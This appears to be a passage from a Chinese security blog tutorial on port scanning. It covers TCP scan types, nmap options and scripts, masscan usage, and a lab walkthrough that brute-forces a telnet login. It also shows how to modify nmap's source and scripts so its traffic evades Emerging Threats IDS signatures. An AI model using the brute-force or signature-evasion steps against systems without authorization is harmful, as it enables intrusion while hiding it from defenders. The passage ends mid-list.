<h4 id="Connect-扫描"><a href="#Connect-扫描" class="headerlink" title="Connect()扫描"></a>Connect()扫描</h4><p>此扫描试图与每一个TCP端口进行“三次握手”通信。如果能够成功建立接连，则证明端口开发，否则为关闭。准确度很高，但是最容易被防火墙和IDS检测到，并且在目标主机的日志中会记录大量的连接请求以及错误信息。</p>
<p>TCP connect端口扫描服务端与客户端建立连接成功（目标端口开放）的过程：</p>
<p>① Client端发送SYN；</p>
<p>② Server端返回SYN/ACK，表明端口开放；</p>
<p>③ Client端返回ACK，表明连接已建立；</p>
<p>④ Client端主动断开连接。</p>
<p>建立连接成功（目标端口开放）</p>
<p><img src="https://i.loli.net/2021/10/05/gFEvBsa6hcmVOou.png" alt="46a499298383fb5fd45371d3f75f7a72.png"></p>
<p><strong>TCP connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程：</strong></p>
<p>① Client端发送SYN；</p>
<p>② Server端返回RST/ACK，表明端口未开放。</p>
<p>未建立连接成功(目标端口关闭)</p>
<p><span style="color: red;">优点</span>：<strong>实现简单</strong>，<strong>对操作者的权限没有严格要求</strong>（有些类型的端口扫描需要操作者具有root权限），系统中的任何用户都有权力使用这个调用，而且如果想要得到从目标端口返回banners信息，也只能采用这一方法。</p>
<p>另一优点是<strong>扫描速度快</strong>。如果对每个目标端口以线性的方式，使用单独的connect()调用，可以通过同时打开多个套接字，从而加速扫描。</p>
<p><span style="color: red;">缺点</span>：是<strong>会在目标主机的日志记录中留下痕迹</strong>，易被发现，<strong>并且数据包会被过滤掉</strong>。目标主机的logs文件会显示一连串的连接和连接出错的服务信息，并且能很快地使它关闭。</p>
<h4 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h4><p>扫描器向目标主机的一个端口发送请求连接的SYN包，扫描器在收到SYN/ACK后，不是发送的ACK应答而是发送RST包请求断开连接。这样，三次握手就没有完成，无法建立正常的TCP连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有root权限。</p>
<p><img src="https://i.loli.net/2021/10/05/To91YVd5qQmH8DW.png" alt="8845cb20fb8c5c43b09d3d9c3ee0f07f.png"></p>
<p><strong>端口开放</strong>：1、Client发送SYN 2、Server端发送SYN/ACK 3、Client发送RST断开（只需要前两步就可以判断端口开放）</p>
<p><strong>端口关闭</strong>：1、Client发送SYN 2、Server端回复RST（表示端口关闭）</p>
<p><span style="color: red;">优点</span>：SYN扫描要比TCP Connect()扫描隐蔽一些，SYN仅仅需要发送初始的SYN数据包给目标主机，如果端口开放，则相应SYN-ACK数据包；如果关闭，则响应RST数据包</p>
<h4 id="秘密扫描"><a href="#秘密扫描" class="headerlink" title="秘密扫描"></a>秘密扫描</h4><p>秘密扫描是一种不被审计工具所检测的扫描技术。</p>
<p>它通常用于在通过普通的防火墙或路由器的筛选（filtering）时隐藏自己。</p>
<p>秘密扫描能躲避IDS、防火墙、包过滤器和日志审计，从而获取目标端口的开放或关闭的信息。由于没有包含TCP 3次握手协议的任何部分，所以无法被记录下来，比半连接扫描更为隐蔽。</p>
<p>但是这种扫描的缺点是扫描结果的不可靠性会增加，而且扫描主机也需要自己构造IP包。现有的秘密扫描有TCP FIN扫描、TCP ACK扫描、NULL扫描、XMAS扫描和SYN/ACK扫描等。</p>
<h5 id="NULL扫描"><a href="#NULL扫描" class="headerlink" title="NULL扫描"></a>NULL扫描</h5><p><strong>反向扫描</strong>—-原理是将一个没有设置任何标志位的数据包发送给TCP端口，在正常的通信中至少要设置一个标志位，根据FRC 793的要求，在端口关闭的情况下，若收到一个没有设置标志位的数据字段，那么主机应该舍弃这个分段，并发送一个RST数据包，否则不会响应发起扫描的客户端计算机。也就是说，如果TCP端口处于关闭则响应一个RST数据包，若处于开放则无相应。但是应该知道理由NULL扫描要求所有的主机都符合RFC 793规定，但是windows系统主机不遵从RFC 793标准，且只要收到没有设置任何标志位的数据包时，不管端口是处于开放还是关闭都响应一个RST数据包。但是基于Unix(如Linux)遵从RFC 793标准，所以可以用NULL扫描。 <strong>经过上面的分析，我们知道NULL可以辨别某台主机运行的操作系统是什么操作系统</strong>。</p>
<p><span style="color: red;">端口开放：Client发送Null，Server没有响应</span></p>
<p><img src="https://i.loli.net/2021/10/05/XhoJRmFParscVO8.png" alt="c8492b7911ad031cda1c2397f2591e3d.png"></p>
<p><span style="color: red;">端口关闭：1、Client发送NUll 2、Server回复RST</span></p>
<p><img src="https://i.loli.net/2021/10/05/JxNnrIhd1yYF42k.png" alt="ae2b1f1bbc0be98270853833d4dd318a.png"></p>
<p>说明：Null扫描和前面的TCP Connect（）和SYN的判断条件正好相反。在前两种扫描中，有响应数据包的表示端口开放，<strong>但在NUll扫描中，收到响应数据包表示端口关闭</strong>。反向扫描比前两种隐蔽性高些，但精确度也相对低一些。</p>
<h5 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h5><p>与NULL有点类似，只是FIN为指示TCP会话结束，在FIN扫描中一个设置了FIN位的数据包被发送后，若响应RST数据包，则表示端口关闭，没有响应则表示开放。此类扫描同样不能准确判断windows系统上端口开发情况。</p>
<p><span style="color: red;">端口开放：发送FIN，没有响应</span></p>
<p><span style="color: red;">端口关闭：1、发送FIN 2、回复RST</span></p>
<h5 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h5><p>扫描主机向目标主机发送ACK数据包。根据返回的RST数据包有两种方法可以得到端口的信息。方法一是： <strong>若返回的RST数据包的TTL值小于或等于64，则端口开放，反之端口关闭</strong>，如图所示。</p>
<p><img src="https://i.loli.net/2021/10/05/W4IxheAd3rb9QmK.png" alt="ae854a9215ed0aecad110d320c7af9f8.png"></p>
<h5 id="Xmas-Tree扫描"><a href="#Xmas-Tree扫描" class="headerlink" title="Xmas-Tree扫描"></a>Xmas-Tree扫描</h5><p>通过发送带有下列标志位的tcp数据包</p>
<p>URG：指示数据时紧急数据，应立即处理。</p>
<p>PSH：强制将数据压入缓冲区。</p>
<p>FIN：在结束TCP会话时使用。</p>
<p>正常情况下，三个标志位不能被同时设置，但在此种扫描中可以用来判断哪些端口关闭还是开放，与上面的反向扫描情况相同，依然不能判断windows平台上的端口。</p>
<p><span style="color: red;">端口开放：发送URG/PSH/FIN, 没有响应</span></p>
<p><img src="https://i.loli.net/2021/10/05/FtHk1bY2pyfhqij.png" alt="07b4dd67c6489f9380ee350fb16fdc24.png"></p>
<p><span style="color: red;">端口关闭：1、发送URG/PSH/FIN,没有响应 2、响应RST</span></p>
<p><img src="https://i.loli.net/2021/10/05/CZyuMh8E4cWk2sp.png" alt="e49245d04f2b5014427760380b287d33.png"></p>
<p>XMAS扫描原理和NULL扫描的类似，<strong>将TCP数据包中的ACK、FIN、RST、SYN、URG、PSH标志位置1后发送给目标主机。在目标端口开放的情况下，目标主机将不返回任何信息</strong>。</p>
<h4 id="Dump扫描"><a href="#Dump扫描" class="headerlink" title="Dump扫描"></a>Dump扫描</h4><p>也被称为Idle扫描或反向扫描，在扫描主机时应用了第三方僵尸计算机扫描。由僵尸主机向目标主机发送SYN包。目标主机端口开发时回应SYN|ACK，关闭时返回RST，僵尸主机对SYN|ACK回应RST，对RST不做回应。从僵尸主机上进行扫描时，进行的是一个从本地计算机到僵尸主机的、连续的ping操作。查看僵尸主机返回的Echo响应的ID字段，能确定目标主机上哪些端口是开放的还是关闭的。</p>
<p><img src="https://i.loli.net/2021/10/05/qlFyQgdEDtxIopL.png" alt="3641925bcf36c8b38ef9313c686aceb6.png"></p>
<h3 id="常用命令选项"><a href="#常用命令选项" class="headerlink" title="常用命令选项"></a>常用命令选项</h3><p><strong>执行命令</strong>：<code>nmap [扫描类型] [扫描选项]</code></p>
<ul>
<li>扫描类型</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-sT</td>
<td>TCP connect()扫描：最基本的扫描方式</td>
</tr>
<tr>
<td>-sS</td>
<td>TCP 同步扫描（TCP SYN）</td>
</tr>
<tr>
<td>-sA</td>
<td>ACK 扫描</td>
</tr>
<tr>
<td>-sN; -sF; -sX</td>
<td>TCP Null，FIN，Xmas-Tree扫描</td>
</tr>
<tr>
<td>-sI &lt;zombie host[:probeport]&gt;</td>
<td>Idle扫描</td>
</tr>
<tr>
<td>-sO</td>
<td>对远程主机所支持的IP协议进行扫描</td>
</tr>
<tr>
<td>-sU</td>
<td>使用UDP扫描</td>
</tr>
<tr>
<td>-sP</td>
<td>使用Ping扫描</td>
</tr>
<tr>
<td>-sW</td>
<td>对滑动窗口的扫描</td>
</tr>
<tr>
<td>-sM</td>
<td>TCP Maimon扫描</td>
</tr>
<tr>
<td>-b  &lt;ftp relay host&gt;</td>
<td>FTP弹跳扫描（FTP bounce scan)</td>
</tr>
<tr>
<td>–scanflags</td>
<td>定制的TCP扫描<br>例如，–scanflags URGACKPSHRSTSYNFIN设置了所有标志位</td>
</tr>
</tbody></table>
<ul>
<li>扫描选项</li>
</ul>
<table>
<thead>
<tr>
<th>通用选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-P0</td>
<td>在扫描之前，不必ping主机</td>
</tr>
<tr>
<td>-PT</td>
<td>在扫描之前使用TCP ping确定哪些主机正在运行</td>
</tr>
<tr>
<td>-PS</td>
<td>对于root用户，这个选项使用SYN包而不是ACK包来对目标主机进行扫描</td>
</tr>
<tr>
<td>-PI</td>
<td>设置这个选项，让nmap使用真正的ping（ICMP echo请求）来扫描目标主机是否正在运行</td>
</tr>
<tr>
<td>-PB</td>
<td>这是默认的ping扫描选项。它使用ACK（-PT）和ICMP（-PI）两种扫描选项并行扫描</td>
</tr>
<tr>
<td>-O</td>
<td>扫描主机的操作系统</td>
</tr>
<tr>
<td>-sV</td>
<td>打开版本探测</td>
</tr>
<tr>
<td>–allports</td>
<td>不为版本探测排除任何端口</td>
</tr>
<tr>
<td>-A</td>
<td>全面扫描</td>
</tr>
<tr>
<td>-v</td>
<td>显示扫描过程</td>
</tr>
<tr>
<td>-p &lt;IP范围&gt;</td>
<td>只扫描指定的端口</td>
</tr>
<tr>
<td>-F</td>
<td>快速 (有限的端口) 扫描</td>
</tr>
<tr>
<td>-r</td>
<td>不要按随机顺序扫描端口</td>
</tr>
<tr>
<td>-T &lt;0-5&gt;</td>
<td>设置调速模板，级别越高扫描速度越快</td>
</tr>
<tr>
<td>-S &lt;IP_Address&gt;</td>
<td>源地址欺骗</td>
</tr>
<tr>
<td>-e &lt;interface&gt;</td>
<td>使用指定的网络接口发送和接收报文</td>
</tr>
<tr>
<td>-g &lt;portnumber&gt;</td>
<td>源端口欺骗</td>
</tr>
<tr>
<td>–data-length  &lt;number&gt;</td>
<td>发送报文时 附加随机数据</td>
</tr>
<tr>
<td>–randomize-hosts</td>
<td>对目标主机的顺序随机排列</td>
</tr>
<tr>
<td>-oN &lt;filespec&gt;</td>
<td>标准输出</td>
</tr>
<tr>
<td>-oX &lt;filespec&gt;</td>
<td>XML输出</td>
</tr>
<tr>
<td>-iL &lt;inputfilename&gt;</td>
<td>从文件列表中输入</td>
</tr>
<tr>
<td>-iR &lt;hostnum&gt;</td>
<td>随机选择目标</td>
</tr>
</tbody></table>
<h3 id="Nmap扫描状态"><a href="#Nmap扫描状态" class="headerlink" title="Nmap扫描状态"></a>Nmap扫描状态</h3><ul>
<li>open ：应用程序在该端口接收 TCP连接和 UDP报文。</li>
<li>closed ：关闭的端口对于nmap也是可访问的，它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li>
<li>filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li>
<li>unfiltered ：未被过滤状态意味着端口可访问，但是 nmap无法确定它是开放还是关闭。只有用于映射防火墙规则集的 ACK扫描才会把端口分类到这个状态。</li>
<li>open | filtered ：(开放或者被过滤的)：无法确定端口是开放还是被过滤的，开放的端口不响应就是个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议，FIN，Null 等扫描会引起。</li>
<li>closed | filtered ：(关闭或者被过滤的)：无法确定端口是关闭还是被过滤的。</li>
</ul>
<h3 id="常用扫描方案"><a href="#常用扫描方案" class="headerlink" title="常用扫描方案"></a>常用扫描方案</h3><p>1、对单个主机进行全面扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.1.2 </span><br></pre></td></tr></table></figure>

<p>2、使用SYN扫描整个网段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>3、扫描指定主机的指定端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 0-1024,3389 192.168.1.1-127</span><br></pre></td></tr></table></figure>

<p>4、随机选择100000台主机扫描是否运行Web服务器(80端口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -iR 100000 -p 80</span><br></pre></td></tr></table></figure>

<h3 id="Nmap脚本"><a href="#Nmap脚本" class="headerlink" title="Nmap脚本"></a>Nmap脚本</h3><h4 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script=default</span><br><span class="line">  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file=filename: provide NSE script args in a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help=&lt;Lua scripts&gt;: Show help about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br></pre></td></tr></table></figure>

<p>上面这部分是Nmap关于脚本的参数，下面一个一个来介绍：</p>
<p><strong>-sC</strong> 是指的是采用默认配置扫描，与**–script=default**参数等价</p>
<p><strong>–script=脚本名称</strong>，脚本一般都在<strong>Nmap的安装目录下的scripts目录中</strong></p>
<p>那么Linux下可以查看脚本数量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts | wc -l</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/aHpbjvRhzoMP9S8.png" alt="5dfdbf9ebad804bdae51530e4ea4322d.png"></p>
<p>那么我当前的Nmap是有<strong>602</strong>个很使用的漏洞利用、工具脚本。也可以使用下面一条命令导出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts/ | sed &#x27;s/.nse//&#x27; &gt; scripts.list</span><br></pre></td></tr></table></figure>

<p>那么所有的脚本名称都在<strong>scripts.list</strong>中了，这样做的原因是因为我们传递脚本名称的时候，不能写脚本的文件扩展名(.nse)。</p>
<p><strong>–script-args=key1=value1,key2=value2…</strong> 该参数是用来传递脚本里面的参数的，key1是参数名，该参数对应value1这个值，那么有更多的参数，使用逗号连接，后面例子中会给大家讲解。</p>
<p><strong>–script-args-file=filename</strong>，使用文件来为脚本提供参数。</p>
<p><strong>–script-trace</strong> 如果设置该参数，则所有的脚本收发请求过程。</p>
<p><strong>–script-updatedb</strong> 在Nmap的scripts目录里有一个script.db，该文件中保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启nmap并且调用了此参数，则nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</p>
<p><strong>–script-help=脚本名称</strong>，调用该参数后，Nmap会输出该脚本名称对应的脚本使用参数，以及详细介绍信息。</p>
<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>现在我们用一个很简单的脚本，telnet爆破脚本，我们搜索一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts/ | grep telnet</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/a2wQV4umLnyc9Ai.png" alt="11dafc3bedd4c87c17c238b5b47b19d2.png"></p>
<p>那么可以看到，返回了两个nse脚本名称，那么第一个就是telnet爆破的脚本了，如果不清楚的话，可以使用上面刚介绍过的**–script-help**参数。</p>
<p><img src="https://i.loli.net/2021/10/05/JBvNi3jepwEunqC.png" alt="5e78ad47bd955b4ee396e583bdb25701.png"></p>
<p>可以看到 有一个Nmap的文档地址，正是我们现在想要使用的脚本的详细信息。</p>
<p><img src="https://i.loli.net/2021/10/05/6UN7Zns3MxywR18.png" alt="95d8e6026a3e1dd7beebdb76182d60f0.png"></p>
<p>最后那个 target指的是我们的目标地址。userdb是用户名字典，passdb是密码字典，timeout是每次连接之间的等待超时时间。</p>
<p>当然了，我们也可以直接查看脚本源文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">-- @usage</span><br><span class="line">--   nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s &lt;target&gt;</span><br><span class="line">--</span><br><span class="line">-- @output</span><br><span class="line">-- 23/tcp open  telnet</span><br><span class="line">-- | telnet-brute:</span><br><span class="line">-- |   Accounts</span><br><span class="line">-- |     wkurtz:colonel</span><br><span class="line">-- |   Statistics</span><br><span class="line">-- |_    Performed 15 guesses in 19 seconds, average tps: 0</span><br><span class="line">--</span><br><span class="line">-- @args telnet-brute.timeout   Connection time-out timespec (default: &quot;5s&quot;)</span><br><span class="line">-- @args telnet-brute.autosize  Whether to automatically reduce the thread</span><br><span class="line">--                              count based on the behavior of the target</span><br><span class="line">--                              (default: &quot;true&quot;)</span><br></pre></td></tr></table></figure>

<p>上方这块，可以看到有一个例子，还有常规的扫描结果。那么加粗的这行是笔者故意为之，因为在某些情况下，<strong>管理员可能会更改telnet服务的端口</strong>（这里不只是光指Telnet），那么我们就无法使用这个脚本了。聪明的你一定想到了更改上方的<strong>23</strong>端口吧！但是这还不够灵活～ 我们可以将端口号自制成一个变量，通过我们的脚本参数传递进去。这里不再过多赘述。</p>
<p>下面我们来实战一下，先扫描一下靶机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -Pn -F 192.168.123.188</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/BVxNAbZiCsk9MaQ.png" alt="d609cbcc9ba1850803475896f11b8802.png"></p>
<p>发现开启了23号端口（telnet服务）</p>
<p>我把字典放到了 <strong>/usr/share/nmap/nselib/data</strong>，因为这个目录中是专门存放Nmap默认字典的。</p>
<p>扫描命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 23 -Pn --script=telnet-brute --script-args=userdb=admins.lst,passdb=passwords.lst,telnet-brute.timeout=3s --script-trace 192.168.123.188</span><br></pre></td></tr></table></figure>

<p>在这我用**–script-trace**开启了数据的收发开关，扫描结果如下：</p>
<p><img src="https://i.loli.net/2021/10/05/Jz5rloZIT7ymU2P.png" alt="e13b32677cd0c2b986d892cba23166ed.png"></p>
<p>试试使用Telnet登录</p>
<p><img src="/:/edcd4ad56ed5407b9a12c0ce81f3bc93" alt="ed3da32313f541b436115f74b7eee8fe.png"></p>
<p>登录成功！</p>
<h4 id="脚本分类"><a href="#脚本分类" class="headerlink" title="脚本分类"></a>脚本分类</h4><p>【vuln】漏洞检测方面：<a href="https://nmap.org/nsedoc/categories/vuln.html">vuln NSE Category</a></p>
<p>【auth】权限验证方面：<a href="https://nmap.org/nsedoc/categories/auth.html">auth NSE Category</a></p>
<p>【brute】暴力破解方面：<a href="https://nmap.org/nsedoc/categories/brute.html">brute NSE Category</a></p>
<p>【discovery】服务信息发现：<a href="https://nmap.org/nsedoc/categories/discovery.html">discovery NSE Category</a></p>
<p>【dos】DOS攻击方面：<a href="https://nmap.org/nsedoc/categories/dos.html">dos NSE Category</a></p>
<p>【exploit】漏洞利用方面：<a href="https://nmap.org/nsedoc/categories/exploit.html">exploit NSE Category</a></p>
<p>【external】外部扩展方面：<a href="https://nmap.org/nsedoc/categories/external.html">external NSE Category</a> （集成了shodanAPI）</p>
<p>【fuzzer】FUZZ测试方面：<a href="https://nmap.org/nsedoc/categories/fuzzer.html">fuzzer NSE Category</a></p>
<p>【intrusive】一些针对的服务入侵模块：<a href="https://nmap.org/nsedoc/categories/intrusive.html">intrusive NSE Category</a></p>
<p>【malware】恶意后门方面：<a href="https://nmap.org/nsedoc/categories/malware.html">malware NSE Category</a></p>
<p>【version】版本识别：<a href="https://nmap.org/nsedoc/categories/version.html">version NSE Category</a></p>
<p>以上参数都可以作为**–script<strong>的通配参数，例如：</strong>–script=vuln**</p>
<p>-<strong>-script=all</strong> 调用所有脚本扫描</p>
<h3 id="Nmap流量特征修改"><a href="#Nmap流量特征修改" class="headerlink" title="Nmap流量特征修改"></a>Nmap流量特征修改</h3><p>现在主流的流量分析设备也将其流量加入了特征库，为了防止在探测阶段IP就被封掉，对其的流量特征做一些简单的修改有点用的。</p>
<h4 id="Win值修改"><a href="#Win值修改" class="headerlink" title="Win值修改"></a>Win值修改</h4><p>通过观察可以发现nmap在使用SYN扫描时Windows的窗口值值固定是1024。</p>
<p>（PS ：window 关键字用于检查特定的TCP窗口大小）</p>
<p><img src="https://i.loli.net/2021/10/05/HtRwjhkfT21Bc9G.jpg" alt="img"></p>
<p>下面是正常连接3389时，发送的数据包。可以看到win值明显不一样。</p>
<p><img src="https://pic2.zhimg.com/80/v2-656045f55b5adf42a0e495ff4ce92375_720w.jpg" alt="img"></p>
<p>修改<strong>tcpip.cc</strong>文件中tcp-&gt;th_win的值，查询TCP中win这个值的信息发现，默认最大为65535。所以应该在此范围内都可以。</p>
<p>但是要考虑已公开的规则，如之前大佬写的bypass emergingthreats这篇，这个就过滤了2048 1024 3072 4096。</p>
<p><img src="https://pic2.zhimg.com/80/v2-344d90cda7c57744b3e019efb7a5c819_720w.jpg" alt="img"></p>
<h4 id="关键词修改"><a href="#关键词修改" class="headerlink" title="关键词修改"></a>关键词修改</h4><p>根据规则，一个一个去修改文件即可。</p>
<p>nmap，nm，nm@p，OR sqlspider等等，主要的就是SIP文件和一些常用的脚本文件。</p>
<p>这些个就是从emergingthreats的规则中提取的。</p>
<p><img src="https://i.loli.net/2021/10/05/iTr1c9Xm53FfMtz.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/tmnU5A21pFgPS4X.jpg" alt="img"></p>
<h4 id="UDP探测时填充值修改"><a href="#UDP探测时填充值修改" class="headerlink" title="UDP探测时填充值修改"></a>UDP探测时填充值修改</h4><p>修改<strong>osscan2.cc</strong></p>
<p>也可通过-O参数修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static u8 patternbyte = 0x43; /* character &#x27;C&#x27; */ 替换为 static u8 patternbyte = 0x46; /* character &#x27;F&#x27; */</span><br></pre></td></tr></table></figure>

<p>重新编译后再去扫描，内容已经换了，长度应该也是可以调整。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u8 packet[328]; /* 20 IP hdr + 8 UDP hdr + 300 data */</span><br></pre></td></tr></table></figure>

<p>这里还没测试，感兴趣可以自己去定义，看会不会有什么问题。</p>
<p><img src="https://i.loli.net/2021/10/05/YBiyZ3a4zIRpVtX.jpg" alt="img"></p>
<h4 id="修改脚本中的值"><a href="#修改脚本中的值" class="headerlink" title="修改脚本中的值"></a>修改脚本中的值</h4><ul>
<li>nselib/http.lua</li>
</ul>
<p>USER<em>AGENT = stdnse.get</em>script_args(‘http.useragent’)</p>
<ul>
<li>nselib/mssql.lua</li>
</ul>
<p>搜索Nmap NSE然后替换</p>
<ul>
<li>nselib/sip.lua</li>
</ul>
<p>搜索Nmap NSE然后替换</p>
<ul>
<li>scripts/http-sql-injection.nse</li>
</ul>
<p>搜索sqlspider然后替换</p>
<ul>
<li>scripts/ssl-heartbleed.nse</li>
</ul>
<p>搜索Nmap ssl-heartbleed替换</p>
<ul>
<li>nselib/rdp.lua</li>
</ul>
<p>local cookie = “mstshash=nmap”</p>
<h3 id="Nmap衍生"><a href="#Nmap衍生" class="headerlink" title="Nmap衍生"></a>Nmap衍生</h3><h4 id="Zenmap"><a href="#Zenmap" class="headerlink" title="Zenmap"></a>Zenmap</h4><p><strong>Zenmap是Nmap的官方GUI(图形界面)版本</strong>。</p>
<p><img src="https://i.loli.net/2021/10/05/Ku1R2VbmSD6f9gE.png" alt="img"></p>
<h4 id="DNmap"><a href="#DNmap" class="headerlink" title="DNmap"></a>DNmap</h4><p>dnmap是使用客户端/服务器体系结构的分布式nmap框架。 服务器从文件中读取命令，并将其发送给每个客户端。 客户端执行nmap命令并将结果发送回去。</p>
<p>下载地址：<a href="https://sourceforge.net/projects/dnmap/">https://sourceforge.net/projects/dnmap/</a></p>
<p>有关DNmap的使用可以参考：<a href="https://www.bilibili.com/read/cv5791617/">https://www.bilibili.com/read/cv5791617/</a></p>
<p><img src="https://i.loli.net/2021/10/05/JQCfYZrFNulcaV5.jpg" alt="dnmap_architecture_2"></p>
<h2 id="MasScan"><a href="#MasScan" class="headerlink" title="MasScan"></a>MasScan</h2><h3 id="MasScan的介绍"><a href="#MasScan的介绍" class="headerlink" title="MasScan的介绍"></a>MasScan的介绍</h3><p>Masscan 作为一个端口扫描工具，具备优秀的性能，能够在短时间内对大量的IP和端口进行是否开放的扫描，使用简单，相比于NMAP等工具来说更容易上手，是网络安全领域的优秀工具。Masscan使用C语言编写，核心部分使用C90编写，包含了大量TCP协议相关，以及操作系统相关的底层代码，代码注释完善，十分详尽，结构清晰，是十分值得学习的C语言网络项目。</p>
<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p &lt;ports,–ports &lt;ports&gt;&gt; 		指定端口进行扫描</span><br><span class="line">-–banners 				获取banner信息，支持少量的协议</span><br><span class="line">-–rate &lt;packets-per-second&gt; 		指定发包的速率</span><br><span class="line">-c &lt;filename&gt;, --conf &lt;filename&gt; 	读取配置文件进行扫描</span><br><span class="line">–-echo 				将当前的配置重定向到一个配置文件中，可以将文件与-c选项一起使用。</span><br><span class="line">-e &lt;ifname&gt; , --adapter &lt;ifname&gt; 	指定用来发包的网卡接口名称</span><br><span class="line">–-adapter-ip &lt;ip-address&gt; 		指定发包的IP地址</span><br><span class="line">–-adapter-port &lt;port&gt; 			指定发包的源端口</span><br><span class="line">–-adapter-mac &lt;mac-address&gt; 		指定发包的源MAC地址</span><br><span class="line">–-router-mac &lt;mac address&gt; 		指定网关的MAC地址</span><br><span class="line">–-exclude &lt;ip/range&gt; 			IP地址范围黑名单，防止masscan扫描</span><br><span class="line">–-excludefile &lt;filename&gt; 		指定IP地址范围黑名单文件</span><br><span class="line">–-includefile，-iL &lt;filename&gt; 		读取一个范围列表进行扫描</span><br><span class="line">–-ping 				扫描应该包含ICMP回应请求</span><br><span class="line">–-append-output 			以附加的形式输出到文件</span><br><span class="line">-–iflist 				列出可用的网络接口，然后退出</span><br><span class="line">–-retries 				发送重试的次数，以1秒为间隔</span><br><span class="line">-–nmap 				打印与nmap兼容的相关信息</span><br><span class="line">-–http-user-agent &lt;user-agent&gt; 	设置user-agent字段的值</span><br><span class="line">-–show [open,close] 			告诉要显示的端口状态，默认是显示开放端口</span><br><span class="line">-–noshow [open,close] 			禁用端口状态显示</span><br><span class="line">-–pcap &lt;filename&gt; 			将接收到的数据包以libpcap格式存储</span><br><span class="line">-–regress 				运行回归测试，测试扫描器是否正常运行</span><br><span class="line">-–ttl &lt;num&gt; 				指定传出数据包的TTL值，默认为255</span><br><span class="line">-–wait &lt;seconds&gt; 			指定发送完包之后的等待时间，默认为10秒</span><br><span class="line">-–offline 				没有实际的发包，主要用来测试开销</span><br><span class="line">-sL 					不执行扫描，主要是生成一个随机地址列表</span><br><span class="line">–readscan &lt;binary-files&gt; 		读取从-oB生成的二进制文件，可以转化为XML或者JSON格式</span><br><span class="line">–connection-timeout &lt;secs&gt; 		抓取banners时指定保持TCP连接的最大秒数，默认是30秒</span><br><span class="line">-oX &lt;filename&gt;				输出到filename的XML。</span><br><span class="line">-oG &lt;filename&gt;				输出到filename在的grepable格式。</span><br><span class="line">-oJ &lt;filename&gt;				输出到filename在JSON格式。</span><br></pre></td></tr></table></figure>

<h3 id="常用扫描方案-1"><a href="#常用扫描方案-1" class="headerlink" title="常用扫描方案"></a>常用扫描方案</h3><ul>
<li>简单使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.0/24 -p445</span><br></pre></td></tr></table></figure>

<ul>
<li>单ip多端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.188 -p1-1024,8080,3306</span><br></pre></td></tr></table></figure>

<ul>
<li>多ip单端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.1-192.168.123.100,192.168.123.188 -p80</span><br></pre></td></tr></table></figure>

<ul>
<li>快速扫描</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.0/24 -p1-1024 --rate 10000</span><br></pre></td></tr></table></figure>

<ul>
<li>把当前命令的配置保存下来，然后在其他masscan命令直接引用</li>
</ul>
